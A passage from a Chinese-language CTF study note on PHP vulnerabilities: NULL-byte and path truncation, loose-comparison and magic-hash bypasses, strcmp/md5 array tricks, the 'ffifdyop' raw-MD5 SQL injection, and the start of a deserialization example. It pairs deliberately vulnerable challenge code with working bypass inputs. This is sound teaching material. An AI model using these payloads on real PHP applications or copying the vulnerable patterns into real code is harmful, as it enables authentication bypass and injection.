class="comment">#因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。</span></span><br><span class="line"><span class="comment">#对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 &gt; 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>,$_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)    </span><br><span class="line">       &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="move-uploaded-file-用-0截断"><a href="#move-uploaded-file-用-0截断" class="headerlink" title="move_uploaded_file 用\0截断"></a>move_uploaded_file 用\0截断</h3><p>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7<br>原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生<br>cve：<br><a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348" target="_blank" rel="noopener">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a></p>
<p><code>move_uploaded_file($_FILES[&#39;x&#39;][&#39;tmp_name&#39;],&quot;/tmp/test.php\x00.jpg&quot;)</code><br>上传抓包修改name为a.php\0jpg（\0是nul字符），可以看到$_FILES[‘xx’][‘name’]存储的字符串是a.php，不会包含\0截断之后的字符，因此并不影响代码的验证逻辑。<br>但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。</p>
<h3 id="inclue用？截断"><a href="#inclue用？截断" class="headerlink" title="inclue用？截断"></a>inclue用？截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];  </span><br><span class="line">$filename=$name.<span class="string">'.php'</span>;  </span><br><span class="line"><span class="keyword">include</span> $filename;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。<br>测试POC：<br><a href="http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt" target="_blank" rel="noopener">http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt</a>?<br>则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。</p>
<h3 id="系统长度截断"><a href="#系统长度截断" class="headerlink" title="系统长度截断"></a>系统长度截断</h3><p>这种方式在PHP5.3以后的版本中都已经得到了修复。<br>win260个字符，linux下4*1024=4096字节</p>
<h3 id="mysql长度截断"><a href="#mysql长度截断" class="headerlink" title="mysql长度截断"></a>mysql长度截断</h3><p>mysql内的默认字符长度为255，超过的就没了。<br>由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning</p>
<h3 id="mysql中utf-8截断"><a href="#mysql中utf-8截断" class="headerlink" title="mysql中utf-8截断"></a>mysql中utf-8截断</h3><p><code>insert into dvwa.test values (14,concat(&quot;admin&quot;,0xc1,&quot;abc&quot;))</code></p>
<p>写入为admin</p>
<h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><p>原理</p>
<p>比较表：<a href="http://php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">http://php.net/manual/zh/types.comparisons.php</a></p>
<p>以下等式会成立<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span> == <span class="number">0</span> == <span class="keyword">false</span></span><br><span class="line"><span class="string">'123'</span> == <span class="number">123</span></span><br><span class="line"><span class="string">'abc'</span> == <span class="number">0</span></span><br><span class="line"><span class="string">'123a'</span> == <span class="number">123</span></span><br><span class="line"><span class="string">'0x01'</span> == <span class="number">1</span></span><br><span class="line"><span class="string">'0e123456789'</span> == <span class="string">'0e987654321'</span></span><br><span class="line">[<span class="keyword">false</span>] == [<span class="number">0</span>] == [<span class="keyword">NULL</span>] == [<span class="string">''</span>]</span><br><span class="line"><span class="keyword">NULL</span> == <span class="keyword">false</span> == <span class="number">0</span></span><br><span class="line"><span class="keyword">true</span> == <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h3 id="、-gt-、-lt-的弱类型比较"><a href="#、-gt-、-lt-的弱类型比较" class="headerlink" title="==、&gt;、&lt;的弱类型比较"></a>==、&gt;、&lt;的弱类型比较</h3><p>这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##方法1</span></span><br><span class="line"><span class="comment">##$a["a1"]="1e8%00";</span></span><br><span class="line"><span class="comment">##这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1</span></span><br><span class="line"><span class="comment">##方法2</span></span><br><span class="line"><span class="comment">##$a["a1"]=["a"];</span></span><br><span class="line"><span class="comment">##使用数组，可以，因为数组恒大于数字或字符串</span></span><br><span class="line"><span class="comment">##方法3</span></span><br><span class="line"><span class="comment">##$a["a1"]=1337a;</span></span><br><span class="line"><span class="comment">##1337a过is_numeric，又由&gt;转成1337与1336比较</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">is_numeric(@$a[<span class="string">"a1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;    </span><br><span class="line"><span class="keyword">if</span>(@$a[<span class="string">"a1"</span>])&#123;</span><br><span class="line">		var_dump($a);</span><br><span class="line">        ($a[<span class="string">"a1"</span>]&gt;<span class="number">1336</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($v1);</span><br></pre></td></tr></table></figure>
<h3 id="switch-弱类型"><a href="#switch-弱类型" class="headerlink" title="switch 弱类型"></a>switch 弱类型</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一种：弱类型，1e==1</span></span><br><span class="line"><span class="comment">// $x1=1e</span></span><br><span class="line"><span class="comment">// 第二种：利用数组名字bypass</span></span><br><span class="line"><span class="comment">// $x1=1[]</span></span><br><span class="line"><span class="comment">// 传入后为string(3) "1[]",但在switch那里为1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>]))</span><br><span class="line">&#123; </span><br><span class="line">        $x1 = $_GET[<span class="string">'x1'</span>]; </span><br><span class="line">        $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        <span class="keyword">switch</span> ($x1) </span><br><span class="line">        &#123; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line">                $a=<span class="number">1</span>; </span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="md5比较（0e相等、数组为Null）"><a href="#md5比较（0e相等、数组为Null）" class="headerlink" title="md5比较（0e相等、数组为Null）"></a>md5比较（0e相等、数组为Null）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">'240610708'</span>) <span class="comment">//0e462097431906509019562988736854</span></span><br><span class="line">md5(<span class="string">'QNKCDZO'</span>) <span class="comment">//0e830400451993494058024219903391</span></span><br><span class="line"><span class="number">0</span>e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。</span><br><span class="line">md5(<span class="string">'240610708'</span>)==md5(<span class="string">'QNKCDZO'</span>); <span class="comment">//True</span></span><br><span class="line">md5(<span class="string">'240610708'</span>)===md5(<span class="string">'QNKCDZO'</span>); <span class="comment">//False</span></span><br><span class="line"></span><br><span class="line">这样的对应数值还有：</span><br><span class="line">var_dump(md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>));</span><br><span class="line">var_dump(md5(<span class="string">'aabg7XSs'</span>) == md5(<span class="string">'aabC9RqS'</span>));</span><br><span class="line">var_dump(sha1(<span class="string">'aaroZmOk'</span>) == sha1(<span class="string">'aaK1STfY'</span>));</span><br><span class="line">var_dump(sha1(<span class="string">'aaO8zKZF'</span>) == sha1(<span class="string">'aa3OFF9m'</span>));</span><br><span class="line">var_dump(<span class="string">'0010e2'</span> == <span class="string">'1e3'</span>);</span><br><span class="line">var_dump(<span class="string">'0x1234Ab'</span> == <span class="string">'1193131'</span>);</span><br><span class="line">var_dump(<span class="string">'0xABCdef'</span> == <span class="string">' 0xABCdef'</span>);</span><br></pre></td></tr></table></figure>
<p>技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#方法1</span></span><br><span class="line"><span class="comment">#s1=QNKCDZO&amp;s2=240610708</span></span><br><span class="line"><span class="comment">#方法2</span></span><br><span class="line"><span class="comment">#?s1[]=1&amp;s2[]=2</span></span><br><span class="line"><span class="comment">#利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null</span></span><br><span class="line"><span class="comment">#则可以使：[1] !== [2] &amp;&amp; md5([1]) ===md5([2])</span></span><br><span class="line">define(<span class="string">'FLAG'</span>, <span class="string">'pwnhub&#123;THIS_IS_FLAG&#125;'</span>);</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'s1'</span>] != $_GET[<span class="string">'s2'</span>]</span><br><span class="line">&amp;&amp; md5($_GET[<span class="string">'s1'</span>]) == md5($_GET[<span class="string">'s2'</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"success, flag:"</span> . FLAG;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null</span></span><br><span class="line">$name = addslashes($_POST[<span class="string">'name'</span>]);</span><br><span class="line">$r = $db-&gt;get_row(<span class="string">"SELECT `pass` FROM `user` WHERE `name`='&#123;$name&#125;'"</span>);</span><br><span class="line"><span class="keyword">if</span> ($r[<span class="string">'pass'</span>] === md5($_POST[<span class="string">'pass'</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="json传数据-“key”-0"><a href="#json传数据-“key”-0" class="headerlink" title="json传数据{“key”:0}"></a>json传数据{“key”:0}</h3><p>PHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">application/x-www-form-urlencoded</span><br><span class="line">multipart/form-data</span><br><span class="line">application/json</span><br><span class="line">application/xml</span><br></pre></td></tr></table></figure></p>
<p>第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.</p>
<p>{“key”:”0”}</p>
<p>这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：</p>
<p>{“key”:0}</p>
<h3 id="strcmp漏洞1：返回0"><a href="#strcmp漏洞1：返回0" class="headerlink" title="strcmp漏洞1：返回0"></a>strcmp漏洞1：返回0</h3><p>适用与5.3之前版本的php</p>
<p><code>int strcmp ( string $str1 , string $str2 )</code><br>// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br>当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##flag[]=admin</span></span><br><span class="line">define(<span class="string">'FLAG'</span>, <span class="string">'pwnhub&#123;THIS_IS_FLAG&#125;'</span>);</span><br><span class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'flag'</span>], FLAG) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"success, flag:"</span> . FLAG;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="strcmp漏洞2：返回Null"><a href="#strcmp漏洞2：返回Null" class="headerlink" title="strcmp漏洞2：返回Null"></a>strcmp漏洞2：返回Null</h3><p>修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。<br>array和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。<br><code>strcmp($c[1],$d)</code></p>
<h3 id="strcmp漏洞3-判断使用的是"><a href="#strcmp漏洞3-判断使用的是" class="headerlink" title="strcmp漏洞3: 判断使用的是 =="></a>strcmp漏洞3: 判断使用的是 ==</h3><p>而判断使用的是==，当NULL==0是 bool(true)</p>
<h3 id="in-array，array-search-弱类型比较"><a href="#in-array，array-search-弱类型比较" class="headerlink" title="in_array，array_search 弱类型比较"></a>in_array，array_search 弱类型比较</h3><p>松散比较下，任何string都等于true：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in_array('a', [true, 'b', 'c'])       // 返回bool(true)，相当于数组里面有字符'a'</span></span><br><span class="line"><span class="comment">// array_search('a', [true, 'b', 'c'])   // 返回int(0)，相当于找到了字符'a'</span></span><br><span class="line"><span class="comment">// array_search 会使用'ctf'和array中的每个值作比较，这里的比较也是弱比较，所以intval('ctf')==0.</span></span><br><span class="line"><span class="keyword">if</span>(is_array(@$a[<span class="string">"a2"</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(count($a[<span class="string">"a2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"a2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</span><br><span class="line">        $pos = array_search(<span class="string">"ctf"</span>, $a[<span class="string">"a2"</span>]);</span><br><span class="line">        $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>($a[<span class="string">"a2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">            $val===<span class="string">"ctf"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $v2=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sha1-md5-报错相等绕过（False-False）"><a href="#sha1-md5-报错相等绕过（False-False）" class="headerlink" title="sha1() md5() 报错相等绕过（False === False）"></a>sha1() md5() 报错相等绕过（False === False）</h3><p>sha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false<br>md5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##?name[]=1&amp;password[]=2</span></span><br><span class="line"><span class="comment">## === 两边都是false则成立</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br></pre></td></tr></table></figure></p>
<h3 id="strpos数组NULL-Null-False"><a href="#strpos数组NULL-Null-False" class="headerlink" title="strpos数组NULL(Null !== False)"></a>strpos数组NULL(Null !== False)</h3><p>strpos()输入数组出错返回null</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>) <span class="comment"># %00截断</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="十六进制与十进制比较"><a href="#十六进制与十进制比较" class="headerlink" title="十六进制与十进制比较"></a>十六进制与十进制比较</h3><p>== 两边的十六进制与十进制比较，是可以相等的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#?password=0xdeadc0de</span></span><br><span class="line"><span class="comment">#echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($temp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">    $one = ord(<span class="string">'1'</span>);  <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">    $nine = ord(<span class="string">'9'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">    $number = <span class="string">'3735929054'</span>;</span><br><span class="line">    <span class="comment">// Check all the input characters!</span></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment">// Disallow all the digits!</span></span><br><span class="line">        $digit = ord($temp&#123;$i&#125;);</span><br><span class="line">        <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) <span class="comment">## 1到9不允许，但0允许</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Aha, digit not allowed!</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"flase"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($number == $temp) <span class="comment"># </span></span><br><span class="line">        <span class="keyword">return</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> noother_says_correct($temp);</span><br></pre></td></tr></table></figure>
<h2 id="md5注入带入’or’"><a href="#md5注入带入’or’" class="headerlink" title="md5注入带入’or’"></a>md5注入带入’or’</h2><p>原理：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">md5(string,raw)</span><br><span class="line">raw	可选。规定十六进制或二进制输出格式：</span><br><span class="line">    <span class="keyword">TRUE</span> - 原始 <span class="number">16</span> 字符二进制格式</span><br><span class="line">    <span class="keyword">FALSE</span> - 默认。<span class="number">32</span> 字符十六进制数</span><br></pre></td></tr></table></figure></p>
<p>当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为<code>&#39;or&#39;&lt;trash&gt;</code> 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 执行顺序:字符串：ffifdyop -&gt; md5()加密成276f722736c95d99e921722cf9ed621c-&gt;md5(,true)将16进制转成字符串`'or'&lt;trash&gt;`-&gt;sql执行`'or'&lt;trash&gt;`造成注入</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE username = admin pass = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="switch没有break"><a href="#switch没有break" class="headerlink" title="switch没有break"></a>switch没有break</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里case 0 和 1 没有break,使得程序继续往下执行。</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'which'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $which = $_GET[<span class="string">'which'</span>];</span><br><span class="line">    <span class="keyword">switch</span> ($which)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">require_once</span> $which.<span class="string">'.php'</span>;</span><br><span class="line">         <span class="keyword">echo</span> $flag;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'PHP-0817'</span>, <span class="string">'Hacker NoNoNo!'</span>, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- index.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> width=<span class="string">"100%"</span>/&gt;</span><br><span class="line">&lt;!-- shield.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span 